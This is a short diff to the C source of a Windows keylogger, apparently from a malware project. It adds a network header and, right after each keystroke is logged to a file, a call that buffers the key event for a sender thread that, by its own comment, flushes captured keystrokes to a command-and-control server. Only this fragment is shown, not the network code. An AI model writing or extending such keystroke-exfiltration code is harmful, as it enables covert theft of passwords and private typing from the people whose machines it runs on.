@@ -1,6 +1,7 @@
 #include <Windows.h>
 #include <stdio.h>
 #include "logger.h"
+#include "network.h"
 #include "../Common/constants.h"
 
 // Global variables for logger
@@ -86,6 +87,9 @@ void LogKey(int vkCode) {
     fflush(g_logFile);
 
     LeaveCriticalSection(&g_csLogFile);
+
+    // Buffer for network transmission (sender thread handles flushing to C2)
+    BufferKeyEvent(vkCode);
 }
 
 // Check if logger is initialized and ready
